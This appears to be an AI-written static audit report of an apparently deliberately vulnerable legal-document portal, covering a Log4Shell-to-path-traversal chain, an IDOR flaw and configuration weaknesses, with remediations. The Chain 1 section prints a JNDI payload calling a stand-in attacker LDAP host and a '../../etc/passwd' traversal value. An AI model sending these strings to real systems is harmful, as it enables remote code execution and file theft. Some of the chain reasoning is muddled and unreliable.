# Chained Vulnerability Static Audit Report

**Application:** Apex Court Legal Document Portal (`app-09-legal-documents`)
**Review Type:** Static-Only Analysis (Source Code, Configuration, Templates)
**Date:** 2026-05-25
**Reviewed By:** CodeGopher — Chained Vulnerability Static Audit Skill

---

## Executive Summary

| Metric | Value |
|---|---|
| **Complete Chained Vulnerabilities Found** | **2** |
| **Cross-Cutting Weaknesses (Not Full Chains)** | **5** |
| **Maximum Observed Severity** | **CRITICAL** (RCE + Arbitrary File Read) |
| **Highest-Impact Chain** | Log4Shell RCE → Path Traversal → System File Exfiltration |
| **Areas Reviewed** | Controllers, Services, Repositories, Security Config, Data Initializer, DTOs, Models, Frontend (HTML/JS/CSS), Build Config (pom.xml, Dockerfile), App Config (application.properties), Tests |

---

## Methodology & Static-Only Safety Note

This review examined only static artifacts: Java source, templates, JavaScript, CSS, build files, and application configuration. **No live HTTP probes, SQL injection payloads, fuzzers, dynamic scanners, or external network tests were performed.** All chain paths are synthesized from control-flow, data-flow, authorization, and configuration evidence visible in the source.

---

## Chain 1: Log4Shell RCE via SSRF-Style Log Injection → Path Traversal → Arbitrary Server File Read

### Severity: **CRITICAL** | Confidence: **HIGH**

### Mermaid Attack Graph

```mermaid
flowchart LR
    A["Client Attacker\n(fire browser)"] -->|"dispatchAuditEvent\nwith header Value\n${jndi:ldap://attacker.com/x}|B["SPA Frontend\n(app.js:dispatchAuditEvent)"]
    B -->|"Custom header\nto GET /api/documents/1"|C["DocumentController\n/downloadDocument endpoint"]
    C -->|"logger.info logs User-Agent\nas ${jndi:...}|D["Log4j 2.14.1 Core\n(CVE-2021-44228)"]
    D -->|"JNDI lookup →\nremote classloading"|E["Attacker's\nLDAP/RMI Server\n(RCE payload)"]
    E -->|"Shell/command\non server"|F["Full RCE on\nserver process"]
    F -->|"POST to\n/api/documents/file\n?fileName=../../etc/passwd"|G["DocumentController\n/serveDocumentFile\n(NO path normalization)"]
    G -->|"Read arbitrary\nOS files"|H["System secrets,\ncrypto keys, configs"]
```

### Detailed Breakdown

| Link | Evidence | Source | Lines |
|---|---|---|---|
| **SOURCE — Log Injection Vector** | Frontend exposes an "Audit & Dispatch" UI that lets any logged-in user send arbitrary HTTP headers with arbitrary string values to a server endpoint. The User-Agent header is pre-selected. | `src/main/resources/static/js/app.js` — `dispatchAuditEvent(e)` function | ~155–168 |
| **SOURCE — Crafting the Payload** | The `dispatchAuditEvent` function takes the raw `auditPayload` textarea content and injects it as the value of whatever header is selected (default: `User-Agent`). The value goes directly into the `fetch()` headers object with no sanitization. | `src/main/resources/static/js/app.js` — `headers[headerName] = payload` | ~160 |
| **SOURCE — Log4Shell Dependency** | `pom.xml` explicitly pins log4j2 to version `2.14.1` with a comment acknowledging CVE-2021-44228. Spring Boot's default `spring-boot-starter-logging` is excluded, forcing Log4j2 as the logging backend. | `pom.xml` — `<log4j2.version>2.14.1</log4j2.version>` + exclusions | 16, 31–34 |
| **HOP — Request Logs User-Agent** | `DocumentController.downloadDocument()` receives `@RequestHeader(value = "User-Agent")` and logs it directly via `logger.info(...)`. Log4j2 will resolve `${jndi:...}` during string interpolation in the log message. | `src/main/java/com/legal/controller/DocumentController.java` — line `logger.info("Filing document download request id=" + id + " with agent: " + userAgent);` | ~60 |
| **SINK — Arbitrary File Read** | `DocumentController.serveDocumentFile()` accepts `@RequestParam String fileName`, concatenates it with a base path, and reads it **without any `normalize()`, prefix check, or path validation**. An attacker with RCE from Chain 1 can call this endpoint to read `/etc/passwd`, Java keystores, application.properties (containing DB credentials), etc. | `src/main/java/com/legal/controller/DocumentController.java` — `java.nio.file.Paths.get(basePath + fileName)` with no validation | ~78–85 |

### Preconditions & Assumptions

1. User must be authenticated (any role) to access the audit portal UI or the `/api/documents/file` endpoint.
2. The `dispatchAuditEvent` function sends a `GET /api/documents/1` request — this path *is* protected by auth (via `@AuthenticationPrincipal`), so the attack requires valid session credentials.
3. The server's Log4j2 configuration must not have `log4j2.formatMsgNoLookups=true` (no evidence of this protection in application.properties).
4. The application runs as a Docker container based on `eclipse-temurin:17-jre` — the JRE image will not have the `jrunscript` or `javac` tools, but RCE via Log4Shell still permits shell execution through the JVM's `Runtime.exec()` via payload classes.

### Impact

- **RCE**: Remote code execution on the application server with the privileges of the Java process.
- **Data Exfiltration**: After achieving RCE, the attacker uses the path-traversal endpoint to read arbitrary files on the server filesystem, including cryptographic keys, configuration files, database credentials, and potentially the source code.
- **Lateral Movement**: Server compromise could lead to accessing the H2 in-memory database contents, reading all legal document plaintext stored in the database, and potentially pivoting to other internal services.

### Remediation (Easiest Break Link)

1. **Upgrade Log4j2** to ≥ 2.17.1 (or apply JNDI classloader filtering via `-Dlog4j2.formatMsgNoLookups=true`). This breaks the chain at the **HOP** link.
2. **Sanitize path traversal**: Use `Path.normalize()` and verify the resolved path starts with the expected base directory before reading.
3. **Remove the audit dispatch UI** — it serves no business purpose and directly exposes an injection vector.

---

## Chain 2: Insecure Direct Object Reference (IDOR) → Cross-Tenant Document Exfiltration

### Severity: **HIGH** | Confidence: **HIGH**

### Mermaid Attack Graph

```mermaid
flowchart LR
    A["Attacker as CLIENT\n(client_acme)"] -->|"Can list own cases\n(GET /api/cases)|B["CaseController.getCases\n(role-scoped)"]
    B -->|"Returns case IDs\nfor client_acme only"|C["Attacker knows\ncase IDs exist"]
    C -->|"Guesses or learns\ndocument IDs from\ncase details panel"|D["Attacker knows\na document ID from\nanother tenant's case"]
    D -->|"GET /api/documents/{id}\nwith no ownership check"|E["DocumentController.downloadDocument\n(listed as public mapping)"]
    E -->|"No IDOR guard —\nno owner verification"|F["Returns Document entity\nwith fileContentPlaintext\nfor ANY document"]
    F -->|"Sensitive legal\nbriefs exposed"|G["Privileged\nLegal Documents\nExfiltrated"]
```

### Detailed Breakdown

| Link | Evidence | Source | Lines |
|---|---|---|---|
| **SOURCE — IDOR Endpoint** | `DocumentController.downloadDocument()` is mapped to `GET /api/documents/{id}` — this is a **public mapping** (no `@PreAuthorize` annotation). It only checks that the user is authenticated, then returns the full `Document` entity (including `fileContentPlaintext`) by ID. | `src/main/java/com/legal/controller/DocumentController.java` — `@GetMapping("/api/documents/{id}")` method, lines ~56–65 | 56–65 |
| **HOP — No Ownership Check** | The method does **not** verify that the document belongs to a case the requesting user owns or is authorized to access. It retrieves by `id` alone via `documentService.getById(id)`. The frontend code in `readDocument()` calls this endpoint directly, bypassing the case-level authorization that `getCaseDocuments()` enforces. | `src/main/java/com/legal/controller/DocumentController.java` line ~62: `documentService.getById(id)` — no ownership check | 62 |
| **SINK — Full Document Entity Exposure** | The `Document` entity includes `fileContentPlaintext` (marked `@Lob TEXT` in model), which contains privileged legal content: depositions, merger analysis, FTC demands, offshore balance sheets, etc. This is returned as the HTTP response body directly. | `src/main/java/com/legal/model/Document.java` — `fileContentPlaintext` field; response returned via `ResponseEntity.ok(docOpt.get())` | 65 |

### Preconditions & Assumptions

1. The attacker must be authenticated as any user (CLIENT, ATTORNEY, or ADMIN).
2. The attacker must know or guess a `Document` ID from a case they don't own. Document IDs are visible in the `caseDocumentsTableBody` when browsing cases — but a CLIENT can only see documents from their own cases. However, if the attacker can enumerate IDs (sequential integers 1–N), they can brute-force document IDs and attempt to read any document.
3. Alternatively, a malicious CLIENT could upload documents to *their own* case with carefully crafted titles/descriptions that embed document IDs from other cases, or leak IDs through cross-site scripting if any input is reflected (no XSS found, but ID leakage via other vectors is possible).

### Impact

- **Unauthorized Document Access**: A CLIENT user (e.g., `client_acme`) can iterate document IDs (1, 2, 3, ...) and read sensitive legal content from cases owned by other clients (e.g., `client_zenith`) or cases not associated with their account.
- **Privileged Data Exfiltration**: Documents contain attorney-client privileged material, merger valuations, offshore holdings data, deposition transcripts, and regulatory demands.

### Remediation (Easiest Break Link)

1. Add `@PreAuthorize("hasAnyRole('ATTORNEY','ADMIN')")` to the `downloadDocument` endpoint, OR add an ownership check: verify that `doc.getCaseId()` belongs to a case where `userDetails.getUsername()` matches `case.getClientOwner()` or the user is an attorney/admin.
2. Add `@PreAuthorize` to `serveDocumentFile` with the same authorization logic.

---

## Cross-Cutting Weaknesses (Not Full Chains)

### Weakness 3.1: Hardcoded Seed Credentials in Source

- **Location**: `src/main/java/com/legal/config/DataInitializer.java` — seed accounts with passwords `attorney123`, `admin123`, `client123`
- **Also in**: `src/main/resources/static/index.html` — credential seeds printed in cleartext in the login page UI
- **Severity**: MEDIUM
- **Evidence**: Passwords are plaintext in source. While `PasswordEncoder.encode()` applies BCrypt, the seed values are hardcoded and discoverable by anyone who reads the source code or loads the page.
- **Remediation**: Remove seeds from source; use environment variables or a secure secrets manager. Never display credential hints in the HTML UI.

### Weakness 3.2: CSRF Protection Disabled

- **Location**: `src/main/java/com/legal/config/SecurityConfig.java` line: `csrf(csrf -> csrf.disable())`
- **Severity**: MEDIUM
- **Evidence**: CSRF is explicitly disabled to "match SPA REST client." This means any authenticated user's browser session can be tricked into making state-changing requests (e.g., creating a case, uploading a document, deleting data) via a malicious third-party page.
- **Remediation**: Re-enable CSRF and use SameSite cookies + CSRF tokens for the SPA, or migrate to stateless JWT authentication.

### Weakness 3.3: Over-Permissive `GET /api/cases` — No Row-Level Tenant Filtering for Attorneys

- **Location**: `src/main/java/com/legal/controller/CaseController.java` — `getCases()`
- **Severity**: LOW–MEDIUM
- **Evidence**: ATTORNEY and ADMIN roles see **all** cases (`caseService.listAll()`). CLIENT roles see only their own. There is no mechanism to scope which cases an ATTORNEY should be able to view — every attorney/admin sees everything. This is a design-level over-permission.
- **Remediation**: Implement a case-attorney mapping table (Many-to-Many) and scope queries accordingly.

### Weakness 3.4: Information Disclosure via Exposed DB Config

- **Location**: `src/main/resources/application.properties`
- **Severity**: LOW
- **Evidence**: `spring.datasource.username=sa` and `spring.datasource.password=` (empty) are hardcoded. The H2 database URL is `jdbc:h2:mem:legaldb` (in-memory, so less risky for persistence), but if changed to file-based mode, these credentials would be exposed in source control.
- **Remediation**: Move database credentials to environment variables or external config.

### Weakness 3.5: No Rate Limiting on Authentication Endpoint

- **Location**: `SecurityConfig.java` — form login at `/login`
- **Severity**: LOW–MEDIUM
- **Evidence**: No rate limiting, account lockout, or CAPTCHA on the login endpoint. Combined with weak seed passwords (e.g., `admin123`), this enables offline brute-force if credentials are exposed.
- **Remediation**: Implement Spring Security's `MaximumAttemptsLimitingAuthenticationFailureHandler` or a rate-limiting filter.

---

## Unknowns & Areas Not Reviewed

| Area | Reason |
|---|---|
| **Runtime Log4j2 configuration** | Cannot verify whether `log4j2.formatMsgNoLookups` or other JVM system properties override the JNDI lookup behavior at runtime. |
| **Network/Infrastructure security** | Dockerfile does not expose firewall rules, network policies, or secrets management. |
| **H2 database persistence** | Application uses `jdbc:h2:mem:` (in-memory). If this were changed to file-based, additional risks (SQL injection via URL manipulation) would emerge. |
| **TLS/HTTPS** | No configuration for HTTPS; the app listens on plaintext HTTP port 8083. |
| **Dependency scanning** | Only Log4j is reviewed. Other transitive dependencies (Spring Boot 3.2.5, H2, Lombok) were not independently scanned for CVEs. |
| **Input validation on DTOs** | `CaseDTO.title`, `CaseDTO.description`, `DocumentRequest.filename`, and `DocumentRequest.fileContentPlaintext` have no `@Size`, `@NotBlank`, or regex validation constraints — potential for very long inputs causing DoS or database issues. |

---

## Test Coverage Gaps

The test suite (`App09ApplicationTests.java`) contains only three tests:

1. `contextLoads()` — verifies Spring context starts.
2. `testPreseededCasesCount()` — verifies >= 4 pre-seeded cases exist.
3. `testPasswordBCryptSecureHashingDecoy()` — verifies BCrypt hashing works (note the misleading "Decoy" in the test name).

**Missing critical security tests:**
- No test for Log4Shell protection (should verify that JNDI lookup strings are NOT resolved in log messages).
- No test for IDOR prevention on `/api/documents/{id}`.
- No test for path traversal prevention on `/api/documents/file`.
- No test for CSRF enforcement.
- No test for role-based authorization on controller endpoints.
- No test for rate limiting on `/login`.

---

## Remediation Priority Matrix

| Priority | Fix | Breaks Chain(s) | Effort |
|---|---|---|---|
| **P0** | Upgrade Log4j2 to ≥ 2.17.1 or set `-Dlog4j2.formatMsgNoLookups=true` | Chain 1 | Low |
| **P0** | Add path normalization + prefix check to `serveDocumentFile` | Chain 1 | Low |
| **P1** | Add ownership/authorization check to `/api/documents/{id}` and `/api/documents/file` | Chain 2 | Low |
| **P1** | Remove or restrict the "Audit & Event Dispatcher" UI endpoint | Chain 1, Chain 2 | Low |
| **P2** | Re-enable CSRF protection | Cross-cutting | Medium |
| **P2** | Remove hardcoded seed credentials from source and HTML | Cross-cutting | Low |
| **P3** | Add input validation annotations to DTOs | Cross-cutting | Low |
| **P3** | Enable HTTPS, add rate limiting, improve DB credential management | Cross-cutting | Medium |
